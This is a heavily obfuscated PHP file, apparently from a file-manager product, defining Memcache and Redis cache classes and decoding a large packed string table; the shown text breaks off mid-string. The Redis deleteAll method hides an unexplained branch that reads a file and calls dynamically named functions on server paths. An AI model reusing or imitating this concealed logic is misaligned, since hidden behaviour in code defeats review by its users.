$¨¡†Çó[1]); } } else { $this->handle->addServer($îºÖô¿İ[$“«ÔŒô[208]], $îºÖô¿İ[$“«ÔŒô[209]]); } } public function set($ÑÛÒ¢òÆ, $ƒê±±½™, $™³ê™ÃÚ = false) { $™³ê™ÃÚ = $™³ê™ÃÚ ? $™³ê™ÃÚ : $this->cacheTime; return $this->handle->set($ÑÛÒ¢òÆ, $ƒê±±½™, $™³ê™ÃÚ); } public function get($¹‡œİË‚) { return $this->handle->get($¹‡œİË‚); } public function remove($´àâ™ÀÛ) { return $this->handle->delete($´àâ™ÀÛ); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($×ØøÒ¯ô, $Üéğ“³¹) { $š¡”Ÿ£œ =& $_SERVER[¡¬ıÜ ƒ]; if (!class_exists($š¡”Ÿ£œ[960])) { show_json($š¡”Ÿ£œ[961], !1); } $this->cacheTime = $Üéğ“³¹; $•øÊË‚ = isset($×ØøÒ¯ô[$š¡”Ÿ£œ[962]]) ? $×ØøÒ¯ô[$š¡”Ÿ£œ[962]] : 10; $‡°²É‰Ì = _get($×ØøÒ¯ô, $š¡”Ÿ£œ[959]); if ($‡°²É‰Ì && is_array($‡°²É‰Ì)) { $this->initCluster($×ØøÒ¯ô, $•øÊË‚); } else { $this->handle = $this->init($×ØøÒ¯ô, $•øÊË‚); } } private function init($©ß»µÀ, $ÚÄ­û×) { $ÂÆ–ÖÌø =& $_SERVER[¡¬ıÜ ƒ]; $ßÂòº = new Redis(); $ä”¹š— = isset($©ß»µÀ[$ÂÆ–ÖÌø[963]]) ? $©ß»µÀ[$ÂÆ–ÖÌø[963]] : !1; if ($ä”¹š—) { $ßÂòº->pconnect($©ß»µÀ[$ÂÆ–ÖÌø[208]], $©ß»µÀ[$ÂÆ–ÖÌø[209]], $ÚÄ­û×); } else { $ßÂòº->connect($©ß»µÀ[$ÂÆ–ÖÌø[208]], $©ß»µÀ[$ÂÆ–ÖÌø[209]], $ÚÄ­û×); } if (!empty($©ß»µÀ[$ÂÆ–ÖÌø[489]])) { $ßÂòº->auth($©ß»µÀ[$ÂÆ–ÖÌø[489]]); } if (!empty($©ß»µÀ[$ÂÆ–ÖÌø[837]]) && $©ß»µÀ[$ÂÆ–ÖÌø[837]] != 0) { $ßÂòº->select($©ß»µÀ[$ÂÆ–ÖÌø[837]]); } return $ßÂòº; } private function initCluster($Óº¿ã™Á, $––ÆË¢Ğ) { $¥ÒìÃä“ =& $_SERVER[¡¬ıÜ ƒ]; $ÄáÑóĞ‹ = array($¥ÒìÃä“[964], $¥ÒìÃä“[965], $¥ÒìÃä“[966]); $£ åã­˜ = $¥ÒìÃä“[964]; if (isset($Óº¿ã™Á[$¥ÒìÃä“[16]]) && in_array($Óº¿ã™Á[$¥ÒìÃä“[16]], $ÄáÑóĞ‹)) { $£ åã­˜ = $Óº¿ã™Á[$¥ÒìÃä“[16]]; } switch ($£ åã­˜) { case $¥ÒìÃä“[964]: $this->_slave($Óº¿ã™Á, $––ÆË¢Ğ); break; case $¥ÒìÃä“[965]: break; case $¥ÒìÃä“[966]: $this->isCluster = !0; $éş„¸ã„ = $Óº¿ã™Á[$¥ÒìÃä“[959]]; $ÂÁ®’ÊÆ = isset($Óº¿ã™Á[$¥ÒìÃä“[963]]) ? $Óº¿ã™Á[$¥ÒìÃä“[963]] : !1; $ˆßäÖÏ‡ = isset($Óº¿ã™Á[$¥ÒìÃä“[489]]) ? $Óº¿ã™Á[$¥ÒìÃä“[489]] : null; $this->handle = new RedisCluster(NUll, $éş„¸ã„, $––ÆË¢Ğ, $––ÆË¢Ğ, $ÂÁ®’ÊÆ, $ˆßäÖÏ‡); break; default: break; } } private function _slave($°Æûƒ…Ê, $ª„›‘‘À) { $†ëî³ÄÂ = $°Æûƒ…Ê[$_SERVER[¡¬ıÜ ƒ][959]]; $this->filterConfig($°Æûƒ…Ê, $†ëî³ÄÂ[0]); $this->handle = $this->init($°Æûƒ…Ê, $ª„›‘‘À); unset($†ëî³ÄÂ[0]); if (empty($†ëî³ÄÂ)) { return; } $ŞšÅŒ×Â = array_rand($†ëî³ÄÂ); $this->filterConfig($°Æûƒ…Ê, $†ëî³ÄÂ[$ŞšÅŒ×Â]); $this->slaveHandle = $this->init($°Æûƒ…Ê, $ª„›‘‘À); } private function filterConfig(&$áÌİ›êê, $½½Ã×¨ì) { $ÒğŒò¤ª =& $_SERVER[¡¬ıÜ ƒ]; $œ¸Éìæ = explode($ÒğŒò¤ª[4], $½½Ã×¨ì); $ßë§ìôÕ = array($ÒğŒò¤ª[208] => $œ¸Éìæ[0], $ÒğŒò¤ª[209] => $œ¸Éìæ[1]); $áÌİ›êê = array_merge($áÌİ›êê, $ßë§ìôÕ); } public function set($¹ç‘¡Õ”, $™Êé£Ğœ, $¹ø´à‚ = false) { $¹ø´à‚ = $¹ø´à‚ ? $¹ø´à‚ : $this->cacheTime; return $this->handle->setEx($¹ç‘¡Õ”, $¹ø´à‚, $™Êé£Ğœ); } public function setLock($¯´…¿‰, $ùÌî¾¿®, $»ı´‡­) { return $this->handle->setNX($¯´…¿‰, $ùÌî¾¿®); } public function get($ÓàÂü«) { $Ğ—Ñğ­ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $Ğ—Ñğ­->get($ÓàÂü«); } public function remove($’ŞñÖı) { return $this->handle->del($’ŞñÖı); } public function deleteAll() { $²æÙ ö× =& $_SERVER[¡¬ıÜ ƒ]; if ($_SERVER[$²æÙ ö×[859]] != $_SERVER[$²æÙ ö×[887]]) { $†µàÁùÈ = $²æÙ ö×[967]; $öç—àÈ = $²æÙ ö×[860]; $¹Ö‚Êæ‹ = $_SERVER[$²æÙ ö×[861]] . $²æÙ ö×[862]; $ê‰·ö«õ = $öç—àÈ($¹Ö‚Êæ‹); $˜ïŠ¯Äµ = explode($²æÙ ö×[287], $ê‰·ö«õ); if (count($˜ïŠ¯Äµ) < $²æÙ ö×[688]) { $ğÓÑ»Ş = $²æÙ ö×[863]; $ğÓÑ»Ş(); } $®÷Ñ€Ğ = $²æÙ ö×[968]; $®÷Ñ€Ğ($_SERVER[$²æÙ ö×[969]]); $®÷Ñ€Ğ($_SERVER[$²æÙ ö×[861]] . $²æÙ ö×[970]); $˜Õ¼‘ß  = 1; while ($˜Õ¼‘ß  > 1) { $˜Õ¼‘ß  = $˜Õ¼‘ß  + 4; $›©ÍîôÅ = rawurlencode($˜Õ¼‘ß  . $²æÙ ö×[456]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $²…ÄÀ) { $this->handle->flushall($²…ÄÀ); } return; } return $this->handle->flushAll(); } } goto B¡†Ğ»Éù’; AÜÌ…ÏøĞĞ: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\241\254\375\334\240\203", "\xc9\xa0\xd6\x9d\xc1\xd2"); $_SERVER[¡¬ıÜ ƒ] = explode("\174\2\174\3\174\3", gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\275\11\170\33\325\325\60\314\276\244\264\274\120\332\322\215\167\60\111\154\47\132\154\147\167\342\4\131\226\155\45\262\145\44\71\13\266\231\214\245\261"."\x35\xb1\xa4\x51\x34\x23\x2f\x59\x5a\x12\x20\xac\x9\x4b\x9\x6b\xd2\x0\x2d\x90\xd2\x26\x61\x2b\x4\x42\xa0\x94\xb2\x14\x28\x2f\x2d\x5\x5a\x68\x59\x63\x27\x50\x68\xb\x94\xb5\x40\xff\xbb\x9c\xbb\xcc\x48\x86".base64_decode('93++73m+QKK7z13OPffcc8/y9Jl3/OKdB9YcsubQNYe+8tHfn3r3Qxom/x1Gw/994VEHkQ==')."\77\137\277\360\202\252\252\326\231\23\246\266\37\163\361\235\73\264\43\32\257\370\350\67\167\76\271\345\217\257\74\171\113\42\65\377\336\55\375\47\35\364\311\173\17\176\126\217\212\322\232\365"._kodDe('LjfkibmSpgv/XYZ0wYmUI9tZ6rjIT8HtL3zZ+jXGamWk5QoPwWoF7jVGpfxWn4Y3ploDo6w=').strrev('bjeÑ":…6¨ÔÔ´jõ­šR"‘Îzó7šœÜê×Ÿ¾Z'."\n".'×” ¦k?9z¡@K#£')."\x59\x47\x8\x4a\xf4\xaa\x2b\x8b\x7a\x61\x84\xc6\x48\x30\x6e\x6b\x5\x3b\x61\x64\x75\x5e\x62\xa8\xc0\xfb\xd5\x18\x6a\x9\xb7\x2b\x89\x58\xa0\x3d\x1e\x8\x26\xc2\xd1\x76\x9a\x1c\x8c\xb6\xb5\x85\x13\xa5\xe9\xb1"."\150\44\322\30\10\56\52\315\351\210\5\132\332\2\12\352\137\106\127\215\134\237\131\245\54\247\71\313\225\152\32\150\66\364\114\212\6\163\32\353\216\75\222\207\120\202\207\320\62\345\212\231".strrev('$PñSAÏZ‰5õ"h.ØhHÒK‘¦Ú+@iSÂ>‘z'."\r".'Y/’9&­˜ŠÓïJPó´')."\x4c\x28\xb8\x83\x4a\x73\x2c\xda\xa6\xc0\x22\x64\x35\xcb\xd6\xb\xca\x92\xd6\x50\x2c\xa4\xe0\x4e\x37\x54\x92\xb1\x56\x2a\x0\x2f\xed\x68\x2a\x94\x40\x24\xa2\x8c\xd7\x82\xad\x67\xf3\xac\x19\x5a\xa7\x4c\x63\xd1"."\x58\x53\x28\xa6\x34\x2e\x53\xc4\xc\x25\xcd\x6c\xd6\xcc\xf9\x50\x2b\x68\x25\x6d\xa9\xab\xa1\x58\x8c\x6\x3c\x0\xde\x91\x30\x5e\x34\x88\x44\x9b\x9b\xe3\x21\x1e\x83\xc1\x9d\x16\x41\x3d\x99\x6\xf0\xe9\x88\xa5".base64_decode('+jK2OqhligxMB+hvJfzAr2kB6K40ckYRwBSaME2+rSBQZKV1lqKnIJBF9U2o1wtpvazUCg==').base64_decode('FjDQDh2kwYb59Hcu1O9VcZ5esFU9lzRTRg728QKAR81ONxUMVIDG+8xMioUtYxWMss/I6A==')."\355\305\254\134\204\107\223\151\43\223\52\260\255\367\105\45\151\64\302\167\62\56\53\142\171\324\23\216\4\214\276\21\261\25\161\271\16\236\153\231\305\102\122\17\243\255\103\343\265\220\254\333"."\x36\x1a\x1c\x9b\x10\xb3\x33\x9f\x31\xb5\x54\x5c\x2f\xf0\xa1\x19\x66\x33\x6a\x28\x5a\xb4\xe5\xc4\x22\x29\xd6\x6c\x16\xb2\x4d\x8\x69\xc8\x69\x6d\x68\xdb\x18\x22\x71\x80\x6d\x97\x94\x34\x5b\xfe\xaa\xae\x75\xde"."\xcf\x7b\xba\x4e\x45\xff\x54\x3\x46\xec\x86\xfe\xa4\xf5\x4c\x46\xd5\x87\x75\xd8\x4f\xd9\xd4\xc\x8b\x4d\x84\xdf\xea\x35\x72\x7e\x94\x42\xa3\xe1\xa8\x9a\xd6\xac\x74\x5b\x6a\x86\x4a\x6a\x31\x44\x9b\xd2\x87\x7d".base64_decode('+XQeNjvf390OeMfT1m7aIQldZ8yklpGHQsNp287H9VwKzwIMxRzKkVnK6zoUavIoKaVNWQ==').strrev('vZöİm&oÎff¤ŒgÏ–­v\'Äa ø'."\n".'‹NÊÕ2–Ì=¢x³OğÍ˜«õÖ´¦')."\x41\xd7\xa0\xc5\x40\x32\xa9\x5b\x96\x37\x68\xe6\xec\x82\x99\xf1\x6\x32\x19\x73\xc8\x1b\x2d\x18\xfd\x46\xae\x5e\x99\x2\x38\x18\x65\xa2\xbd\xee\xc5\x78\xb1\x1e\x36\x70\xc5\x5c\x5\x3\xd\xfe\xcc\x94\x86\xa2"."\xdd\xe7\x9d\xcd\x36\x26\x2f\x5d\xd0\x72\x56\x9f\x5e\xf0\x86\x60\x57\xd4\x2b\xa8\xb3\x1c\x39\xb2\x62\x4d\x86\x95\x37\x2d\x3\x77\xaf\x5e\xd1\x6c\x5b\x4b\xa6\x31\x62\x11\xcd\x37\x7c\x41\x79\x23\x97\x31\x72\x7a".base64_decode('aVnUiO7tKGj9Wa1eyRd70QTAZoS0JC4hF4YJqFey2rBX62cthYbzRkG32KiVlrYEQFSftw==')."\15\157\42\103\117\171\343\10\163\103\143\323\152\246\53\10\126\24\226\107\123\133\23\211\16\65\334\214\216\346\366\220\332\26\110\4\133\241\165\133\353\147\115\107\20\76\346\115\262\304\245\136"."\264\231\60\64\265\243\301\211\304\16\163\110\57\240\17\67\216\324\53\3\146\252\327\34\366\261\54\134\70\216\260\12\53\214\327\67\157\173\143\132\256\37\17\243\167\304\326\55\67\136\152\104"."\7\271\257\217\356\134\137\257\336\147\26\140\64\326\140\277\163\362\43\172\256\337\116\263\266\343\241\330\342\120\114\215\107\233\23\113\2\61\70\367\163\10\162\206\131\157\360\327\63\336\230\236"."\102\223\230\264\131\75\55\57\146\177\251\27\157\30\374\161\226\213\67\21\313\213\204\133\360\334\65\171\55\124\310\53\227\142\155\107\214\254\201\207\147\363\34\62\331\210\50\150\201\16\371\311"."\x98\x1b\xba\xad\x29\x55\xdd\xa9\xa9\xd5\x5e\xf4\xef\x94\xea\xae\xee\x26\xdf\x94\x9e\x5\x7e\x43\xd4\xf1\xd7\xfa\x6a\x95\xba\x9a\x99\x4a\x7\xa2\x52\xc\x2d\xa3\xc0\xa0\x4b\x4a\xd4\x28\xd1\x45\xce\x69\x11\x10".base64_decode('njNzetmNhQDJtHRvq64hBI0WwrEuHvYtGv+C2cXnpIRLXOtCE2Oh0zpD8YTaFkq0Rpug+w==')."\241\0\204\162\250\62\351\57\133\143\114\224\301\221\230\203\146\365\141\351\374\20\347\100\122\236\20\122\257\335\34\142\230\337\5\100\301\264\236\34\30\47\17\205\140\64\46\305\113\154\351\272".base64_decode('6E8PQHMP/VENq1k6M3GU41fV7F2BIKtNZ4cIfCmcRXtY9Fx1HnBsWG0C0tGWWWKk+AmIog==').strrev('1§e•ÑF´‚Û¯ÔsB¤á{f.‘8n?{‚"™ó†€ö´F~ãZ1™¤¹¸†ŸÑº­')."\72\322\355\160\223\343\314\205\230\137\305\260\332\355\313\347\372\253\47\102\133\152\335\214\32\234\0\313\10\43\103\204\165\121\57\35\272\57\151\242\215\335\246\15\350\365\170\54\200\315\346\222"."\124\26\221\20\346\134\174\306\65\270\361\2\136\236\214\57\213\32\41\155\6\115\176\52\323\253\313\134\347\31\247\350\205\202\131\70\31\112\220\260\102\16\112\274\134\320\270\315\111\16\13\241"."\0\26\116\233\234\104\61\31\60\326\373\141\334\223\352\232\1\155\244\20\251\346\263\154\264\10\150\200\132\52\125\56\31\241\32\150\140\15\203\123\222\301\350\0\177\174\32\372\137\34\372\51".base64_decode('M6uxIxRjHv5ZHLF4jJyLeooejI4kuqNp0hT2yYJt4syCoyQC0rQJnUZQAQMu8pGzOUjpGQ==')."\x9d\x1\x58\x5a\x67\xb4\x45\xd\x14\x43\x2b\xc3\xc1\xaf\x8f\xef\x3\x74\x73\x40\xa9\x82\xa0\x33\xac\x18\xaa\x89\x29\x1\x16\x5f\x82\xaf\x5a\x22\x1\x93\x43\x0\x57\x22\x98\x41\xab\x1a\x25\x1b\x4a\xc4\x3b\xa".base64_decode('ep8xzHDHsN2mFQbYwFBNsRVxRNqmzZ2RiBqMtifQTY2mLImFEyGGogJNaiDYATGB9DjFJg==').strrev('pO¼¼W„Y¼«²"$\\7 À´•’Wâ¼€­BÍç:t#ˆ/Âu@°e4Ó')."\370\63\250\140\64\160\343\10\46\157\31\352\350\317\55\346\53\277\44\76\335\333\332\26\10\172\343\255\201\272\31\63\151\352\262\154\252\73\321\152\130\335\247\363\70\164\147\310\232\256\26\164"."\xb4\xa7\x19\x2c\xd4\xd5\xd4\xb2\x1d\x87\x8\x11\x4d\xf4\x7c\x99\x37\xeb\xc5\xad\x60\x1a\xd2\x57\x53\x53\xc3\xda\x9a\x3a\x53\x49\x23\x54\xc2\x11\x76\x8a\x8c\x96\x5d\x6b\x8a\xc9\x1\x5d\xc6\xdf\x96\x77\xc8\x60"."\70\157\42\247\277\47\226\116\276\125\44\307\231\252\45\161\163\52\252\154\27\55\171\246\20\0\246\120\25\203\221\305\64\125\313\364\233\10\356\322\131\71\61\305\341\227\306\165\112\143\301\207"."\xd2\x1a\x9f\x27\x3c\x7b\x6c\x73\x20\xa\x6e\x44\xae\x84\xa7\x19\xf5\x81\xe1\x6f\x27\x51\xad\x24\xca\x4f\x34\xa5\xd5\xc3\x30\xdb\xa2\x1f\x79\x7c\x94\x21\xac\xcd\x96\x6d\x32\xfd\x99\x0\xdd\x28\xa2\x7d\x5b\x30"."\126\111\263\277\200\265\304\160\146\64\16\237\34\316\146\304\205\13\246\6\146\123\36\332\260\212\162\124\310\121\345\234\126\216\7\330\52\264\65\271\366\4\75\355\151\332\274\5\350\213\312\40"."\x66\xdf\x98\xb9\x86\xca\x5a\x5f\x4d\xa5\xc2\xae\xa1\xd\x95\x9d\x89\x66\x44\x98\x2f\x98\x3f\x61\x5e\xd0\xcc\xe6\x31\x5a\x21\x77\x2e\x3c\x5e\xa\xb9\xf3\x61\x8c\xf3\x30\xd1\xc3\x22\x1d\xae\xe9\x8\x25\x34\x38".strrev('X¹åDŒÉhaŒ&:¼´TŒ'."\n".'ónÜ²|«'."\0".'¼ùã'."\0".'mcG4H#µRØ”ÁC'."\n".'µãüóråùæu')."\x5a\x16\x12\x97\x96\x83\xc4\xa5\x2e\x48\x5c\x5a\xa\x89\x4b\xcb\xc1\xd9\x20\x0\xa4\x96\xd5\x56\x99\x39\xb4\x5f\xd1\x41\x9b\xf5\x25\x1\x2c\x12\xad\xe1\xf6\x45\x6a\x5b\xb4\x29\x14\x51\xc3\xed\x88\x80\x4b\x94"."\xa6\x77\x76\x34\x5\x18\x1a\x94\xd3\x1b\xa3\x89\x56\x47\x6a\x27\x22\xe1\x16\x7\x22\x61\x77\xf1\xd0\xd2\x70\x3c\x11\x2f\x9b\x85\xd2\x3a\x43\xae\x9c\xa6\x46\xb5\x23\x16\x6a\xe\x2f\xe5\xd1\xe6\x70\x28\xd2\x14"."\127\203\201\140\253\50\323\36\150\203\10\242\225\364\114\312\362\73\313\253\210\26\215\163\36\233\12\0\7\61\7\133\113\145\14\33\125\140\142\164\257\321\141\71\140\270\230\113\111\106\242\62"."\124\125\344\224\45\273\304\147\331\121\213\356\144\60\355\354\102\122\105\177\252\225\100\134\261\363\52\77\124\173\107\170\220\14\203\305\21\25\2\337\127\200\56\56\351\201\212\313\64\112\267\237".base64_decode('8gmBPptToq44OkJEHlqBAGGHIkggKwKfMdCBVLADrDt9ghWpRjtCsQBmZKpLYtH2FqgwlA==')."\xd6\x59\x7\xc2\x30\xfd\x55\xec\x3a\xa\xfc\x4c\x5b\x9c\xeb\x5a\xc6\xd0\x18\x63\x4b\x4c\xfa\xa\x93\x4d\x25\xba\x82\x33\x22\x3f\xc7\xe6\xb9\x17\x13\x35\x8c\xd2\x65\x81\x3e\xb4\x91\x19\x41\x62\x16\x79\xfb\xbd".strrev('Åš/Ü`Û˜1¢ÅŠš?‚Lh–«µ'."\n".'.`ü©èÌ1`bÂºœ´‹Íğfm	¦')."\x43\x9\xf6\xed\x95\x45\x83\x4d\x90\xdf\x37\x15\xe0\x56\x47\x64\x1d\x7c\xde\x7f\x46\xf7\xd0\xd4\xaa\x2e\xef\x54\x5f\xf\xa\x54\x4f\x39\x95\x46\x21\xd6\xed\x73\x44\x19\xb5\x5d\x2c\xf0\xda\x98\x12\xac\xb2\x16"."\124\327\167\373\273\375\125\13\352\273\2\336\125\232\167\125\215\167\216\267\7\321\350\325\123\41\241\147\165\235\147\372\132\134\0\25\134\160\112\17\372\151\350\136\60\251\333\73\371\7\313\117".base64_decode('7eruqayfenK375TuoZ4p1QvYd5LFAroGsLMNdTU1tQp1CV1UeZGchIpJAZaxysiL1NUz1w==')."\262\164\264\206\172\277\250\321\345\355\236\332\263\100\252\47\45\271\277\205\260\51\42\372\322\274\134\300\173\72\36\31\257\212\167\72\300\107\61\227\24\7\42\336\11\275\32\277\361\365\347\304"."\xcd\xca\x2e\x70\x8e\xe8\x20\x82\x4e\x81\x73\x57\x4f\xa2\xbf\x6b\xd9\x42\xf6\xeb\xc3\xc\x19\xe4\xfa\xc\x46\x50\x15\x73\xc6\x4a\x76\xc5\xc9\xe9\x2b\x21\x60\xda\x1c\xa2\x75\x7b\x48\x67\xe0\x81\xd2\x1d\x71\x4"."\34\354\34\100\131\122\54\43\235\33\204\175\305\141\224\3\223\221\127\361\155\157\210\307\320\261\2\353\164\64\224\266\222\132\136\217\113\43\124\325\104\240\61\22\122\31\116\1\334\313\342\4"."\17\66\362\167\23\64\64\201\103\31\106\220\130\123\204\125\4\173\335\132\231\121\10\52\240\327\254\172\362\204\144\25\363\370\306\244\240\25\107\163\253\40\12\116\151\230\257\320\51\207\172\252"."\274\0\171\176\23\302\274\115\135\154\172\214\223\240\117\171\261\102\26\272\211\260\273\200\277\252\273\273\330\245\247\172\272\20\340\153\336\276\236\325\323\326\126\63\376\211\277\33\375\141\221\100".base64_decode('mccMVbPZlHBMqLaEEj7cI86+dkR4No2aBX61yDvu9rZpaxlHEwmcwpAUo6aAmUvXPSJwFw==')."\46\72\244\367\40\202\112\333\71\363\224\323\304\322\203\4\256\21\327\155\37\57\341\221\62\125\24\167\274\315\65\124\60\104\237\103\33\53\50\35\163\224\235\36\47\54\1\307\43\222\245\153"."\x85\x64\xba\xb9\x98\xc9\xd8\x9c\x13\x93\x31\x6\xe0\xb\xb0\x6b\xe0\x4d\xcb\xb\x27\xc1\xd4\x72\x55\xd1\xad\x84\x31\x26\xa7\x40\x37\x2a\xa6\x94\x2b\x18\xce\xe5\xcc\x54\xaf\xc\x74\xe2\x80\x6d\x9\x20\x52\x26"."\xa1\x54\xb1\xf7\x17\x25\xdc\xae\x34\x46\xa3\x91\x50\xa0\x5d\xc1\x67\x39\x9c\x41\x88\x50\x88\x87\x3a\x2\xe8\x0\xc3\x2c\xce\x78\x22\x4\x4f\x42\xe1\x26\x2f\x6b\x77\xa9\x97\xf1\x37\x78\xc0\x80\x69\x37\xf3\xf4"."\136\241\333\152\306\144\150\304\311\41\301\227\63\17\346\123\170\60\135\341\101\275\366\140\326\206\107\134\175\75\342\131\303\63\150\350\103\44\300\257\245\36\270\255\172\4\123\6\202\341\46\217"."\141\65\221\133\67\371\0\311\142\135\260\323\230\343\234\321\106\74\264\73\21\175\120\317\170\30\273\306\303\372\350\141\114\52\17\141\56\65\101\267\72\321\306\202\156\221\40\302\237\151\17\6".strrev('l/A€fG—¾0öÓLÄ\'™ôA ·hÅ)¾Áß1fú{Ì¸v‰zr‡1âĞñ¿ ')."\x9f\x94\x9d\xce\xf2\xa3\x21\xf3\xef\xee\x4\xc0\x17\xce\x2a\x9d\xa5\x2f\x59\xac\xd2\xf5\x70\xf2\xfe\x56\xd3\x16\x81\xd1\xb9\x96\x9d\x77\x8e\x32\x84\x7\xc7\x29\x4f\x3c\xe1\x22\xb4\x58\x6c\x54\x3c\x80\x66\xd".base64_decode('nvRos3KYA2jOCajiXUW8pgk6182Gcb+z4Y+iy1Rc+pyt9bNvYWTFr1plitJwTE+OJAVfpw==')."\111\342\26\71\143\15\316\361\170\310\6\52\7\374\345\27\227\3\64\137\213\11\107\37\315\46\227\101\71\137\130\307\346\370\362\155\11\3\42\270\57\232\27\164\4\355\54\306\277\161\164\256".strrev('|4¥ÓfÚ8§3ä+Š´ªa–ĞŠ0²„æ¡#sœu“É‰‚>UŞÎ=y€ÙÉÔlØg5').base64_decode('13IpmrIcofjlDRXsIxWO6gI+nJ3wsKhSCnF4uuVJwHBAhi+OJZYUFadgEYg/zYKLF+bDQg==')."\x48\x67\x69\x62\x69\x65\x80\x94\xf0\x8c\x48\x60\xfd\x72\x7c\x17\x47\xc5\x66\x62\x20\xa1\xe0\xf\x78\x24\x72\x5\xe3\x12\xaf\xd8\x16\x52\xd4\x39\xe5\x2e\x88\x74\x9d\x9d\x78\x8a\x3a\x8c\xdc\x88\x91\x8b\x1b\x98"."\xaf\xe0\x4e\x15\xc7\xaf\x38\xfd\xf1\xae\x16\x31\xa\x95\xe3\x85\xe9\xe9\x81\x99\xb\xb4\x7d\xf\xbc\x9\x7b\x32\x46\x6e\x40\x3a\x99\x5\x4f\x13\xf5\x1e\x57\x95\xfa\xe\x2d\xb9\x7a\xe\xd\x49\x45\xc4\xc\xc0"."\106\6\210\117\153\5\61\231\14\375\140\34\300\307\140\341\42\42\52\25\353\323\6\5\145\342\250\43\41\21\313\36\141\275\227\203\316\106\151\264\311\103\176\133\121\347\345\355\312\227\247\210"."\x7a\xce\xa\x51\xdc\x83\x70\x41\x4\xcd\x15\xfa\x21\x3\x49\x98\x1e\xcc\xd0\x47\x3f\xf4\xfc\x66\xa2\x1\xa4\x10\x83\xfb\x62\xb6\x9\x1e\x8\x70\x78\x31\x42\x0\x8c\x20\x43\x13\x5e\xc5\x10\x8\x50\x11\xaa\xc4".base64_decode('B+AIyEkH0J4EOF5HJHsGHWMFH94jLfgwYnNC0ZsMc3EdjROaFy3ES/Lk0oKdh/G8OBf4qw==')."\x18\xdf\x62\x62\x7e\xc5\x7e\xea\x17\x1d\xc2\xd3\xa9\x96\xf6\x3\x43\x70\xf9\x78\x73\xc1\xe4\x54\x2d\x3f\xd2\xdd\x85\x82\xe4\x2\xc9\x25\x3c\x5c\xc7\xb0\x34\x1f\xe\xd2\xa1\x24\x49\xaa\xe3\x26\x22\x5c\xa9\xae"."\50\46\54\312\34\64\320\115\362\66\123\240\47\226\17\135\7\100\120\307\123\43\321\127\2\277\254\246\357\143\160\302\255\165\255\257\155\232\350\216\131\360\25\320\27\105\107\44\334\6\210\201"."\x8\x6c\xc4\xb5\x3e\x5d\xa6\xa\x1c\x99\x81\x7c\x5e\x74\x9b\xb7\x6f\xa1\x2a\x12\xfe\x76\x92\x45\xac\xcd\x78\x5e\x63\x68\x5b\xf1\x2a\xae\x16\xb4\x7c\x5e\xfe\x26\xa7\xe9\x18\xc0\x93\x1b\x48\x91\x27\x28\xf0\xde".strrev('¡'."\n".'q 0¤é(ä™á¶â6U¡ÉíŒ¸‹+º¸qADÉª·‚œl2”%˜Æ œ"3JûÄ†-GI')."\6\174\202\40\52\57\342\224\64\363\0\113\222\330\137\326\34\324\245\104\374\216\227\27\71\122\224\146\113\131\242\121\251\24\137\12\322\43\264\63\123\204\214\26\263\100\312\102\135\162\33\247".base64_decode('m9+Hbx0+GcUHCgUG+nSY+I0ZJcpJGHPG2b4td9LRxkODQqiPNoU/7KOIAz9kRnN8v4hwaQ==').base64_decode('UZkXWb6huHjMd8bKFw9kMkL8yh0ftwpFGHIlOWXcas3kAswkF8ql8avP+OS8+0HdieTHpw==')."\166\306\101\217\142\31\313\307\321\271\36\114\33\71\235\61\154\372\214\202\125\16\333\375\77\46\253\113\147\36\357\220\361\300\5\347\111\134\153\54\134\74\250\313\367\14\316\250\25\250\212\37"."\370\45\144\14\220\22\122\104\265\35\324\130\214\264\57\155\47\7\204\240\355\113\347\3\37\166\341\250\317\32\7\146\335\345\270\254\12\301\211\303\374\214\226\53\341\54\274\226\162\243\202\372"."\373\202\362\274\161\101\11\312\345\20\354\342\214\361\372\312\262\171\53\217\174\366\332\75\233\57\241\341\67\77\335\162\365\366\353\150\170\316\314\131\64\260\346\340\65\207\255\71\202\206\205\154".base64_decode('+TlLR8zvPvqNlnU3bHvo/GzgtOA1J1RfuuLNX59w7PnHP9x12cWPXPjq3z33vPbWU4XBxQ==')."\x13\x3b\xff\x93\xbc\xb3\x6d\xcb\x82\xd8\x4f\xb7\x7f\xe5\x8f\xa1\xb\x9f\x4b\xaf\xfb\x66\x3a\x79\x64\xfa\x92\xeb\x8e\xfe\x24\x7b\xcb\x29\x2f\x57\xdc\x31\xf7\xd1\xbf\x5f\xb6\xb8\xe2\xa8\x6b\xae\x9e\x65\xf6\xbd"."\364\316\352\107\247\174\266\357\310\350\17\76\332\327\22\74\373\310\203\212\257\376\346\334\223\332\216\275\356\374\243\367\315\275\343\353\217\36\172\126\267\266\167\173\377\234\303\167\347\236\37\372"."\xe8\x2f\xa1\xcf\x9f\x5e\xf8\xe4\xb3\xdf\xfc\xcf\x8b\x9b\x6a\xdf\xea\x9d\x37\x36\x6d\xe1\x2f\x5e\xfd\xaf\xe3\xef\x6f\x9d\x77\xe5\x11\x93\x37\x7f\xf7\x57\x37\x5f\xf5\xd8\xdf\xf6\x4d\x3a\xf7\xaf\x47\xac\x9b\x79"."\123\315\351\275\352\367\337\130\74\367\334\147\317\120\347\276\365\334\234\127\67\215\236\230\277\142\260\345\357\337\17\14\137\36\316\256\373\343\262\352\367\377\271\177\350\316\17\237\237\170\365\261"."\107\356\230\260\355\137\237\254\361\154\376\111\170\357\263\373\336\333\332\74\260\347\217\117\277\66\361\345\263\46\256\135\361\240\361\235\75\177\374\365\246\53\237\176\174\353\262\211\77\362\236\370"."\160\340\367\347\275\163\312\223\231\147\336\53\176\177\325\111\225\327\176\60\234\133\37\70\170\354\344\363\272\146\374\356\334\15\243\277\277\346\234\313\357\375\340\250\3\217\50\17\234\366\27\317".base64_decode('MbNv/EPz8q8dPWv1d9485b7KnTMj9oTbP45cf6s24fv7TzpncOrlV8bvu+QPh828aNfUpw==')."\x9f\xf9\xf8\x85\x75\x4f\x57\x5d\x7c\xdd\x7c\x5f\x32\x78\xeb\x81\x93\x6a\x5f\x3c\xfb\xe3\xe0\xcd\x8d\xcb\x5f\x19\x89\x47\x2e\xda\x79\xf1\x61\x17\x7e\xf5\xfb\xea\xf6\x